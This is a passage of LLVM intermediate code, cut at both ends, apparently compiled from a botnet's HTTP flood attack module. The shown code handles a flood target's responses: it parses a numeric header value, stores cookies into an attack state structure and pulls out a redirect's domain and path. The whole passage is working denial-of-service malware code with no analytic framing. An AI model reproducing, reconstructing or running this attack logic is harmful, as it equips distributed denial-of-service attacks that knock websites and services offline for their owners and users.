  %1320 = load i32, i32* %44, align 4
  %1321 = sext i32 %1320 to i64
  %1322 = getelementptr inbounds i8, i8* %1319, i64 %1321
  %1323 = load i32, i32* %12, align 4
  %1324 = load i32, i32* %44, align 4
  %1325 = sub nsw i32 %1323, %1324
  %1326 = call i32 @util_memsearch(i8* %1322, i32 %1325, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1326, i32* %45, align 4
  %1327 = load i32, i32* %45, align 4
  %1328 = icmp ne i32 %1327, -1
  br i1 %1328, label %1329, label %1348

; <label>:1329:                                   ; preds = %1318
  %1330 = load i32, i32* %44, align 4
  %1331 = sext i32 %1330 to i64
  %1332 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1331
  store i8* %1332, i8** %46, align 8
  %1333 = load i32, i32* %45, align 4
  %1334 = icmp sge i32 %1333, 2
  br i1 %1334, label %1335, label %1338

; <label>:1335:                                   ; preds = %1329
  %1336 = load i32, i32* %45, align 4
  %1337 = sub nsw i32 %1336, 2
  store i32 %1337, i32* %45, align 4
  br label %1338

; <label>:1338:                                   ; preds = %1335, %1329
  %1339 = load i32, i32* %44, align 4
  %1340 = load i32, i32* %45, align 4
  %1341 = add nsw i32 %1339, %1340
  %1342 = sext i32 %1341 to i64
  %1343 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1342
  store i8 0, i8* %1343, align 1
  %1344 = load i8*, i8** %46, align 8
  %1345 = call i32 @util_atoi(i8* %1344, i32 10)
  %1346 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1347 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1346, i32 0, i32 14
  store i32 %1345, i32* %1347, align 4
  br label %1348

; <label>:1348:                                   ; preds = %1338, %1318
  br label %1352

; <label>:1349:                                   ; preds = %1298
  %1350 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1350, i32 0, i32 14
  store i32 0, i32* %1351, align 4
  br label %1352

; <label>:1352:                                   ; preds = %1349, %1348
  store i32 0, i32* %37, align 4
  br label %1353

; <label>:1353:                                   ; preds = %1528, %1352
  %1354 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1355 = load i32, i32* %37, align 4
  %1356 = sext i32 %1355 to i64
  %1357 = getelementptr inbounds i8, i8* %1354, i64 %1356
  %1358 = load i32, i32* %12, align 4
  %1359 = call i8* @table_retrieve_val(i32 39, i32* null)
  %1360 = call i32 @util_stristr(i8* %1357, i32 %1358, i8* %1359)
  %1361 = icmp ne i32 %1360, -1
  br i1 %1361, label %1362, label %1367

; <label>:1362:                                   ; preds = %1353
  %1363 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1364 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1363, i32 0, i32 15
  %1365 = load i32, i32* %1364, align 4
  %1366 = icmp slt i32 %1365, 5
  br label %1367

; <label>:1367:                                   ; preds = %1362, %1353
  %1368 = phi i1 [ false, %1353 ], [ %1366, %1362 ]
  br i1 %1368, label %1369, label %1532

; <label>:1369:                                   ; preds = %1367
  %1370 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1371 = load i32, i32* %37, align 4
  %1372 = sext i32 %1371 to i64
  %1373 = getelementptr inbounds i8, i8* %1370, i64 %1372
  %1374 = load i32, i32* %12, align 4
  %1375 = call i8* @table_retrieve_val(i32 39, i32* null)
  %1376 = call i32 @util_stristr(i8* %1373, i32 %1374, i8* %1375)
  store i32 %1376, i32* %47, align 4
  %1377 = load i32, i32* %37, align 4
  %1378 = load i32, i32* %47, align 4
  %1379 = add nsw i32 %1377, %1378
  %1380 = sext i32 %1379 to i64
  %1381 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1380
  %1382 = load i8, i8* %1381, align 1
  %1383 = sext i8 %1382 to i32
  %1384 = icmp eq i32 %1383, 32
  br i1 %1384, label %1385, label %1388

; <label>:1385:                                   ; preds = %1369
  %1386 = load i32, i32* %47, align 4
  %1387 = add nsw i32 %1386, 1
  store i32 %1387, i32* %47, align 4
  br label %1388

; <label>:1388:                                   ; preds = %1385, %1369
  %1389 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1390 = load i32, i32* %37, align 4
  %1391 = sext i32 %1390 to i64
  %1392 = getelementptr inbounds i8, i8* %1389, i64 %1391
  %1393 = load i32, i32* %47, align 4
  %1394 = sext i32 %1393 to i64
  %1395 = getelementptr inbounds i8, i8* %1392, i64 %1394
  %1396 = load i32, i32* %12, align 4
  %1397 = load i32, i32* %37, align 4
  %1398 = sub nsw i32 %1396, %1397
  %1399 = load i32, i32* %47, align 4
  %1400 = sub nsw i32 %1398, %1399
  %1401 = call i32 @util_memsearch(i8* %1395, i32 %1400, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1401, i32* %48, align 4
  %1402 = load i32, i32* %48, align 4
  %1403 = icmp ne i32 %1402, -1
  br i1 %1403, label %1404, label %1528

; <label>:1404:                                   ; preds = %1388
  %1405 = load i32, i32* %37, align 4
  %1406 = load i32, i32* %47, align 4
  %1407 = add nsw i32 %1405, %1406
  %1408 = sext i32 %1407 to i64
  %1409 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1408
  store i8* %1409, i8** %49, align 8
  %1410 = load i32, i32* %48, align 4
  %1411 = icmp sge i32 %1410, 2
  br i1 %1411, label %1412, label %1415

; <label>:1412:                                   ; preds = %1404
  %1413 = load i32, i32* %48, align 4
  %1414 = sub nsw i32 %1413, 2
  store i32 %1414, i32* %48, align 4
  br label %1415

; <label>:1415:                                   ; preds = %1412, %1404
  %1416 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1417 = load i32, i32* %37, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds i8, i8* %1416, i64 %1418
  %1420 = load i32, i32* %47, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds i8, i8* %1419, i64 %1421
  %1423 = load i32, i32* %12, align 4
  %1424 = load i32, i32* %37, align 4
  %1425 = sub nsw i32 %1423, %1424
  %1426 = load i32, i32* %47, align 4
  %1427 = sub nsw i32 %1425, %1426
  %1428 = call i32 @util_memsearch(i8* %1422, i32 %1427, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1429 = icmp sgt i32 %1428, 0
  br i1 %1429, label %1430, label %1445

; <label>:1430:                                   ; preds = %1415
  %1431 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1432 = load i32, i32* %37, align 4
  %1433 = sext i32 %1432 to i64
  %1434 = getelementptr inbounds i8, i8* %1431, i64 %1433
  %1435 = load i32, i32* %47, align 4
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds i8, i8* %1434, i64 %1436
  %1438 = load i32, i32* %12, align 4
  %1439 = load i32, i32* %37, align 4
  %1440 = sub nsw i32 %1438, %1439
  %1441 = load i32, i32* %47, align 4
  %1442 = sub nsw i32 %1440, %1441
  %1443 = call i32 @util_memsearch(i8* %1437, i32 %1442, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1444 = sub nsw i32 %1443, 1
  store i32 %1444, i32* %48, align 4
  br label %1445

; <label>:1445:                                   ; preds = %1430, %1415
  %1446 = load i32, i32* %37, align 4
  %1447 = load i32, i32* %47, align 4
  %1448 = add nsw i32 %1446, %1447
  %1449 = load i32, i32* %48, align 4
  %1450 = add nsw i32 %1448, %1449
  %1451 = sext i32 %1450 to i64
  %1452 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1451
  store i8 0, i8* %1452, align 1
  store i32 0, i32* %10, align 4
  br label %1453

; <label>:1453:                                   ; preds = %1468, %1445
  %1454 = load i32, i32* %10, align 4
  %1455 = load i8*, i8** %49, align 8
  %1456 = call i32 @util_strlen(i8* %1455)
  %1457 = icmp slt i32 %1454, %1456
  br i1 %1457, label %1458, label %1471

; <label>:1458:                                   ; preds = %1453
  %1459 = load i8*, i8** %49, align 8
  %1460 = load i32, i32* %10, align 4
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds i8, i8* %1459, i64 %1461
  %1463 = load i8, i8* %1462, align 1
  %1464 = sext i8 %1463 to i32
  %1465 = icmp eq i32 %1464, 61
  br i1 %1465, label %1466, label %1467

; <label>:1466:                                   ; preds = %1458
  br label %1471

; <label>:1467:                                   ; preds = %1458
  br label %1468

; <label>:1468:                                   ; preds = %1467
  %1469 = load i32, i32* %10, align 4
  %1470 = add nsw i32 %1469, 1
  store i32 %1470, i32* %10, align 4
  br label %1453

; <label>:1471:                                   ; preds = %1466, %1453
  %1472 = load i8*, i8** %49, align 8
  %1473 = load i32, i32* %10, align 4
  %1474 = sext i32 %1473 to i64
  %1475 = getelementptr inbounds i8, i8* %1472, i64 %1474
  %1476 = load i8, i8* %1475, align 1
  %1477 = sext i8 %1476 to i32
  %1478 = icmp eq i32 %1477, 61
  br i1 %1478, label %1479, label %1527

; <label>:1479:                                   ; preds = %1471
  %1480 = load i32, i32* %10, align 4
  store i32 %1480, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  br label %1481

; <label>:1481:                                   ; preds = %1500, %1479
  %1482 = load i32, i32* %10, align 4
  %1483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1483, i32 0, i32 15
  %1485 = load i32, i32* %1484, align 4
  %1486 = icmp slt i32 %1482, %1485
  br i1 %1486, label %1487, label %1503

; <label>:1487:                                   ; preds = %1481
  %1488 = load i8*, i8** %49, align 8
  %1489 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1489, i32 0, i32 16
  %1491 = load i32, i32* %10, align 4
  %1492 = sext i32 %1491 to i64
  %1493 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1490, i64 0, i64 %1492
  %1494 = getelementptr inbounds [128 x i8], [128 x i8]* %1493, i32 0, i32 0
  %1495 = load i32, i32* %50, align 4
  %1496 = call signext i8 @util_strncmp(i8* %1488, i8* %1494, i32 %1495)
  %1497 = icmp ne i8 %1496, 0
  br i1 %1497, label %1498, label %1499

; <label>:1498:                                   ; preds = %1487
  store i32 1, i32* %51, align 4
  br label %1503

; <label>:1499:                                   ; preds = %1487
  br label %1500

; <label>:1500:                                   ; preds = %1499
  %1501 = load i32, i32* %10, align 4
  %1502 = add nsw i32 %1501, 1
  store i32 %1502, i32* %10, align 4
  br label %1481

; <label>:1503:                                   ; preds = %1498, %1481
  %1504 = load i32, i32* %51, align 4
  %1505 = icmp ne i32 %1504, 0
  br i1 %1505, label %1526, label %1506

; <label>:1506:                                   ; preds = %1503
  %1507 = load i8*, i8** %49, align 8
  %1508 = call i32 @util_strlen(i8* %1507)
  %1509 = icmp slt i32 %1508, 128
  br i1 %1509, label %1510, label %1525

; <label>:1510:                                   ; preds = %1506
  %1511 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1512 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1511, i32 0, i32 16
  %1513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1513, i32 0, i32 15
  %1515 = load i32, i32* %1514, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1512, i64 0, i64 %1516
  %1518 = getelementptr inbounds [128 x i8], [128 x i8]* %1517, i32 0, i32 0
  %1519 = load i8*, i8** %49, align 8
  %1520 = call i32 @util_strcpy(i8* %1518, i8* %1519)
  %1521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1521, i32 0, i32 15
  %1523 = load i32, i32* %1522, align 4
  %1524 = add nsw i32 %1523, 1
  store i32 %1524, i32* %1522, align 4
  br label %1525

; <label>:1525:                                   ; preds = %1510, %1506
  br label %1526

; <label>:1526:                                   ; preds = %1525, %1503
  br label %1527

; <label>:1527:                                   ; preds = %1526, %1471
  br label %1528

; <label>:1528:                                   ; preds = %1527, %1388
  %1529 = load i32, i32* %47, align 4
  %1530 = load i32, i32* %37, align 4
  %1531 = add nsw i32 %1530, %1529
  store i32 %1531, i32* %37, align 4
  br label %1353

; <label>:1532:                                   ; preds = %1367
  %1533 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1534 = load i32, i32* %12, align 4
  %1535 = call i8* @table_retrieve_val(i32 38, i32* null)
  %1536 = call i32 @util_stristr(i8* %1533, i32 %1534, i8* %1535)
  %1537 = icmp ne i32 %1536, -1
  br i1 %1537, label %1538, label %1717

; <label>:1538:                                   ; preds = %1532
  %1539 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1540 = load i32, i32* %12, align 4
  %1541 = call i8* @table_retrieve_val(i32 38, i32* null)
  %1542 = call i32 @util_stristr(i8* %1539, i32 %1540, i8* %1541)
  store i32 %1542, i32* %52, align 4
  %1543 = load i32, i32* %52, align 4
  %1544 = sext i32 %1543 to i64
  %1545 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1544
  %1546 = load i8, i8* %1545, align 1
  %1547 = sext i8 %1546 to i32
  %1548 = icmp eq i32 %1547, 32
  br i1 %1548, label %1549, label %1552

; <label>:1549:                                   ; preds = %1538
  %1550 = load i32, i32* %52, align 4
  %1551 = add nsw i32 %1550, 1
  store i32 %1551, i32* %52, align 4
  br label %1552

; <label>:1552:                                   ; preds = %1549, %1538
  %1553 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1554 = load i32, i32* %52, align 4
  %1555 = sext i32 %1554 to i64
  %1556 = getelementptr inbounds i8, i8* %1553, i64 %1555
  %1557 = load i32, i32* %12, align 4
  %1558 = load i32, i32* %52, align 4
  %1559 = sub nsw i32 %1557, %1558
  %1560 = call i32 @util_memsearch(i8* %1556, i32 %1559, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1560, i32* %53, align 4
  %1561 = load i32, i32* %53, align 4
  %1562 = icmp ne i32 %1561, -1
  br i1 %1562, label %1563, label %1716

; <label>:1563:                                   ; preds = %1552
  %1564 = load i32, i32* %52, align 4
  %1565 = sext i32 %1564 to i64
  %1566 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1565
  store i8* %1566, i8** %54, align 8
  %1567 = load i32, i32* %53, align 4
  %1568 = icmp sge i32 %1567, 2
  br i1 %1568, label %1569, label %1572

; <label>:1569:                                   ; preds = %1563
  %1570 = load i32, i32* %53, align 4
  %1571 = sub nsw i32 %1570, 2
  store i32 %1571, i32* %53, align 4
  br label %1572

; <label>:1572:                                   ; preds = %1569, %1563
  %1573 = load i32, i32* %52, align 4
  %1574 = load i32, i32* %53, align 4
  %1575 = add nsw i32 %1573, %1574
  %1576 = sext i32 %1575 to i64
  %1577 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1576
  store i8 0, i8* %1577, align 1
  %1578 = load i32, i32* %53, align 4
  %1579 = add nsw i32 %1578, 1
  store i32 %1579, i32* %53, align 4
  %1580 = load i8*, i8** %54, align 8
  %1581 = load i32, i32* %53, align 4
  %1582 = call i32 @util_memsearch(i8* %1580, i32 %1581, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1583 = icmp eq i32 %1582, 4
  br i1 %1583, label %1584, label %1674

; <label>:1584:                                   ; preds = %1572
  store i32 7, i32* %10, align 4
  %1585 = load i8*, i8** %54, align 8
  %1586 = getelementptr inbounds i8, i8* %1585, i64 4
  %1587 = load i8, i8* %1586, align 1
  %1588 = sext i8 %1587 to i32
  %1589 = icmp eq i32 %1588, 115
  br i1 %1589, label %1590, label %1593

; <label>:1590:                                   ; preds = %1584
  %1591 = load i32, i32* %10, align 4
  %1592 = add nsw i32 %1591, 1
  store i32 %1592, i32* %10, align 4
  br label %1593

; <label>:1593:                                   ; preds = %1590, %1584
  %1594 = load i8*, i8** %54, align 8
  %1595 = load i8*, i8** %54, align 8
  %1596 = load i32, i32* %10, align 4
  %1597 = sext i32 %1596 to i64
  %1598 = getelementptr inbounds i8, i8* %1595, i64 %1597
  %1599 = load i32, i32* %53, align 4
  %1600 = load i32, i32* %10, align 4
  %1601 = sub nsw i32 %1599, %1600
  %1602 = sext i32 %1601 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1594, i8* %1598, i64 %1602, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  br label %1603

; <label>:1603:                                   ; preds = %1624, %1593
  %1604 = load i8*, i8** %54, align 8
  %1605 = load i32, i32* %10, align 4
  %1606 = sext i32 %1605 to i64
  %1607 = getelementptr inbounds i8, i8* %1604, i64 %1606
  %1608 = load i8, i8* %1607, align 1
  %1609 = sext i8 %1608 to i32
  %1610 = icmp ne i32 %1609, 0
  br i1 %1610, label %1611, label %1627

; <label>:1611:                                   ; preds = %1603
  %1612 = load i8*, i8** %54, align 8
  %1613 = load i32, i32* %10, align 4
  %1614 = sext i32 %1613 to i64
  %1615 = getelementptr inbounds i8, i8* %1612, i64 %1614
  %1616 = load i8, i8* %1615, align 1
  %1617 = sext i8 %1616 to i32
  %1618 = icmp eq i32 %1617, 47
  br i1 %1618, label %1619, label %1624

; <label>:1619:                                   ; preds = %1611
  %1620 = load i8*, i8** %54, align 8
  %1621 = load i32, i32* %10, align 4
  %1622 = sext i32 %1621 to i64
  %1623 = getelementptr inbounds i8, i8* %1620, i64 %1622
  store i8 0, i8* %1623, align 1
  br label %1627

; <label>:1624:                                   ; preds = %1611
  %1625 = load i32, i32* %10, align 4
  %1626 = add nsw i32 %1625, 1
  store i32 %1626, i32* %10, align 4
  br label %1603

; <label>:1627:                                   ; preds = %1619, %1603
  %1628 = load i8*, i8** %54, align 8
  %1629 = call i32 @util_strlen(i8* %1628)
  %1630 = icmp sgt i32 %1629, 0
  br i1 %1630, label %1631, label %1641

; <label>:1631:                                   ; preds = %1627
  %1632 = load i8*, i8** %54, align 8
  %1633 = call i32 @util_strlen(i8* %1632)
  %1634 = icmp slt i32 %1633, 128
  br i1 %1634, label %1635, label %1641

; <label>:1635:                                   ; preds = %1631
  %1636 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1637 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1636, i32 0, i32 7
  %1638 = getelementptr inbounds [129 x i8], [129 x i8]* %1637, i32 0, i32 0
  %1639 = load i8*, i8** %54, align 8
  %1640 = call i32 @util_strcpy(i8* %1638, i8* %1639)
  br label %1641

; <label>:1641:                                   ; preds = %1635, %1631, %1627
  %1642 = load i8*, i8** %54, align 8
  %1643 = load i32, i32* %10, align 4
  %1644 = add nsw i32 %1643, 1
  %1645 = sext i32 %1644 to i64
  %1646 = getelementptr inbounds i8, i8* %1642, i64 %1645
  %1647 = call i32 @util_strlen(i8* %1646)
  %1648 = icmp slt i32 %1647, 256
  br i1 %1648, label %1649, label %1673

; <label>:1649:                                   ; preds = %1641
  %1650 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1651 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1650, i32 0, i32 6
  %1652 = getelementptr inbounds [257 x i8], [257 x i8]* %1651, i32 0, i32 0
  %1653 = getelementptr inbounds i8, i8* %1652, i64 1
  call void @util_zero(i8* %1653, i32 255)
  %1654 = load i8*, i8** %54, align 8
  %1655 = load i32, i32* %10, align 4
  %1656 = add nsw i32 %1655, 1
  %1657 = sext i32 %1656 to i64
  %1658 = getelementptr inbounds i8, i8* %1654, i64 %1657
  %1659 = call i32 @util_strlen(i8* %1658)
  %1660 = icmp sgt i32 %1659, 0
  br i1 %1660, label %1661, label %1672

; <label>:1661:                                   ; preds = %1649
  %1662 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1663 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1662, i32 0, i32 6
  %1664 = getelementptr inbounds [257 x i8], [257 x i8]* %1663, i32 0, i32 0
  %1665 = getelementptr inbounds i8, i8* %1664, i64 1
  %1666 = load i8*, i8** %54, align 8
  %1667 = load i32, i32* %10, align 4
  %1668 = add nsw i32 %1667, 1
  %1669 = sext i32 %1668 to i64
  %1670 = getelementptr inbounds i8, i8* %1666, i64 %1669
  %1671 = call i32 @util_strcpy(i8* %1665, i8* %1670)
  br label %1672

; <label>:1672:                                   ; preds = %1661, %1649
  br label %1673

; <label>:1673:                                   ; preds = %1672, %1641
  br label %1713

; <label>:1674:                                   ; preds = %1572
  %1675 = load i8*, i8** %54, align 8
  %1676 = getelementptr inbounds i8, i8* %1675, i64 0
  %1677 = load i8, i8* %1676, align 1
  %1678 = sext i8 %1677 to i32
  %1679 = icmp eq i32 %1678, 47
  br i1 %1679, label %1680, label %1712

; <label>:1680:                                   ; preds = %1674
  %1681 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1682 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1681, i32 0, i32 6
  %1683 = getelementptr inbounds [257 x i8], [257 x i8]* %1682, i32 0, i32 0
  %1684 = getelementptr inbounds i8, i8* %1683, i64 1
  call void @util_zero(i8* %1684, i32 255)
  %1685 = load i8*, i8** %54, align 8
  %1686 = load i32, i32* %10, align 4
  %1687 = add nsw i32 %1686, 1
  %1688 = sext i32 %1687 to i64
  %1689 = getelementptr inbounds i8, i8* %1685, i64 %1688
  %1690 = call i32 @util_strlen(i8* %1689)
  %1691 = icmp sgt i32 %1690, 0
  br i1 %1691, label %1692, label %1711

; <label>:1692:                                   ; preds = %1680
  %1693 = load i8*, i8** %54, align 8
  %1694 = load i32, i32* %10, align 4
  %1695 = add nsw i32 %1694, 1
  %1696 = sext i32 %1695 to i64
  %1697 = getelementptr inbounds i8, i8* %1693, i64 %1696
  %1698 = call i32 @util_strlen(i8* %1697)
  %1699 = icmp slt i32 %1698, 256
  br i1 %1699, label %1700, label %1711

; <label>:1700:                                   ; preds = %1692
  %1701 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1702 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1701, i32 0, i32 6
  %1703 = getelementptr inbounds [257 x i8], [257 x i8]* %1702, i32 0, i32 0
  %1704 = getelementptr inbounds i8, i8* %1703, i64 1
  %1705 = load i8*, i8** %54, align 8
  %1706 = load i32, i32* %10, align 4
  %1707 = add nsw i32 %1706, 1
  %1708 = sext i32 %1707 to i64
  %1709 = getelementptr inbounds i8, i8* %1705, i64 %1708
  %1710 = call i32 @util_strcpy(i8* %1704, i8* %1709)
  br label %1711

; <label>:1711:                                   ; preds = %1700, %1692, %1680
  br label %1712

; <label>:1712:                                   ; preds = %1711, %1674
  br label %1713

; <label>:1713:                                   ; preds = %1712, %1673
  %1714 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1715 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1714, i32 0, i32 1
  store i8 1, i8* %1715, align 4
  br label %2531

; <label>:1716:                                   ; preds = %1552
  br label %1717

; <label>:1717:                                   ; preds = %1716, %1532
  %1718 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1719 = load i32, i32* %12, align 4
  %1720 = call i8* @table_retrieve_val(i32 37, i32* null)
  %1721 = call i32 @util_stristr(i8* %1718, i32 %1719, i8* %1720)
  %1722 = icmp ne i32 %1721, -1
  br i1 %1722, label %1723, label %2053

; <label>:1723:                                   ; preds = %1717
  %1724 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1725 = load i32, i32* %12, align 4
  %1726 = call i8* @table_retrieve_val(i32 37, i32* null)
  %1727 = call i32 @util_stristr(i8* %1724, i32 %1725, i8* %1726)
  store i32 %1727, i32* %55, align 4
  %1728 = load i32, i32* %55, align 4
  %1729 = sext i32 %1728 to i64
  %1730 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1729
  %1731 = load i8, i8* %1730, align 1
  %1732 = sext i8 %1731 to i32
  %1733 = icmp eq i32 %1732, 32
  br i1 %1733, label %1734, label %1737

; <label>:1734:                                   ; preds = %1723
  %1735 = load i32, i32* %55, align 4
  %1736 = add nsw i32 %1735, 1
  store i32 %1736, i32* %55, align 4
  br label %1737

; <label>:1737:                                   ; preds = %1734, %1723
  %1738 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1739 = load i32, i32* %55, align 4
  %1740 = sext i32 %1739 to i64
  %1741 = getelementptr inbounds i8, i8* %1738, i64 %1740
  %1742 = load i32, i32* %12, align 4
  %1743 = load i32, i32* %55, align 4
  %1744 = sub nsw i32 %1742, %1743
  %1745 = call i32 @util_memsearch(i8* %1741, i32 %1744, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1745, i32* %56, align 4
  %1746 = load i32, i32* %56, align 4
  %1747 = icmp ne i32 %1746, -1
  br i1 %1747, label %1748, label %2052

; <label>:1748:                                   ; preds = %1737
  %1749 = load i32, i32* %55, align 4
  %1750 = sext i32 %1749 to i64
  %1751 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1750
  store i8* %1751, i8** %57, align 8
  %1752 = load i32, i32* %56, align 4
  %1753 = icmp sge i32 %1752, 2
  br i1 %1753, label %1754, label %1757

; <label>:1754:                                   ; preds = %1748
  %1755 = load i32, i32* %56, align 4
  %1756 = sub nsw i32 %1755, 2
  store i32 %1756, i32* %56, align 4
  br label %1757

; <label>:1757:                                   ; preds = %1754, %1748
  %1758 = load i32, i32* %55, align 4
  %1759 = load i32, i32* %56, align 4
  %1760 = add nsw i32 %1758, %1759
  %1761 = sext i32 %1760 to i64
  %1762 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1761
  store i8 0, i8* %1762, align 1
  %1763 = load i32, i32* %56, align 4
  %1764 = add nsw i32 %1763, 1
  store i32 %1764, i32* %56, align 4
  store i32 0, i32* %10, align 4
  br label %1765

; <label>:1765:                                   ; preds = %1791, %1757
  %1766 = load i8*, i8** %57, align 8
  %1767 = load i32, i32* %10, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds i8, i8* %1766, i64 %1768
  %1770 = load i8, i8* %1769, align 1
  %1771 = sext i8 %1770 to i32
  %1772 = icmp ne i32 %1771, 0
  br i1 %1772, label %1773, label %1789

; <label>:1773:                                   ; preds = %1765
  %1774 = load i8*, i8** %57, align 8
  %1775 = load i32, i32* %10, align 4
  %1776 = sext i32 %1775 to i64
  %1777 = getelementptr inbounds i8, i8* %1774, i64 %1776
  %1778 = load i8, i8* %1777, align 1
  %1779 = sext i8 %1778 to i32
  %1780 = icmp sge i32 %1779, 48
  br i1 %1780, label %1781, label %1789

; <label>:1781:                                   ; preds = %1773
  %1782 = load i8*, i8** %57, align 8
  %1783 = load i32, i32* %10, align 4
  %1784 = sext i32 %1783 to i64
  %1785 = getelementptr inbounds i8, i8* %1782, i64 %1784
  %1786 = load i8, i8* %1785, align 1
  %1787 = sext i8 %1786 to i32
  %1788 = icmp sle i32 %1787, 57
  br label %1789

; <label>:1789:                                   ; preds = %1781, %1773, %1765
  %1790 = phi i1 [ false, %1773 ], [ false, %1765 ], [ %1788, %1781 ]
  br i1 %1790, label %1791, label %1794

; <label>:1791:                                   ; preds = %1789
  %1792 = load i32, i32* %10, align 4
  %1793 = add nsw i32 %1792, 1
  store i32 %1793, i32* %10, align 4
  br label %1765

; <label>:1794:                                   ; preds = %1789
  %1795 = load i8*, i8** %57, align 8
  %1796 = load i32, i32* %10, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds i8, i8* %1795, i64 %1797
  %1799 = load i8, i8* %1798, align 1
  %1800 = sext i8 %1799 to i32
  %1801 = icmp ne i32 %1800, 0
  br i1 %1801, label %1802, label %2051

; <label>:1802:                                   ; preds = %1794
  store i32 0, i32* %58, align 4
  %1803 = load i8*, i8** %57, align 8
  %1804 = load i32, i32* %10, align 4
  %1805 = sext i32 %1804 to i64
  %1806 = getelementptr inbounds i8, i8* %1803, i64 %1805
  store i8 0, i8* %1806, align 1
  %1807 = load i32, i32* %10, align 4
  %1808 = add nsw i32 %1807, 1
  store i32 %1808, i32* %10, align 4
  %1809 = load i8*, i8** %57, align 8
  %1810 = load i32, i32* %10, align 4
  %1811 = sext i32 %1810 to i64
  %1812 = getelementptr inbounds i8, i8* %1809, i64 %1811
  %1813 = load i8, i8* %1812, align 1
  %1814 = sext i8 %1813 to i32
  %1815 = icmp eq i32 %1814, 32
  br i1 %1815, label %1816, label %1819

; <label>:1816:                                   ; preds = %1802
  %1817 = load i32, i32* %10, align 4
  %1818 = add nsw i32 %1817, 1
  store i32 %1818, i32* %10, align 4
  br label %1819

; <label>:1819:                                   ; preds = %1816, %1802
  %1820 = load i8*, i8** %57, align 8
  %1821 = load i32, i32* %10, align 4
  %1822 = sext i32 %1821 to i64
